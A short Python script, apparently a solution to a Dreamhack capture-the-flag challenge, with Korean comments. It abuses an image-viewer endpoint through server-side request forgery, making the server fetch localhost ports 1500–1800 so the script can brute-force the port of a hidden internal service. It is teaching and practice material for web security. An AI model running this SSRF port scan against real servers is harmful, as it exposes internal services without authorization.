import requests

# iterable의 현재 진행 상황을 보여주는 라이브러리, tqdm(range(i)) == trange(i)
from tqdm import tqdm

HOST = 'host1.dreamhack.games'
PORT = 14518
url = f'http://{HOST}:{PORT}'

# NOT_FOUND 이미지 src의 base64 값 앞부분
NOT_FOUND_SRC = 'iVBORw0K'


# 1500~1800까지 랜덤하게 생성된 포트 번호를 브루트포스로 찾기
for i in tqdm(range(1500, 1801)):
    res = requests.post(f'{url}/img_viewer',
                        data={"url": f'http://Localhost:{i}'})

    # NOT_FOUND 이미지 외에 다른 이미지를 반환하는 포트를 찾기
    if NOT_FOUND_SRC not in res.text:
        print('\nFount PORT is', i)
        break
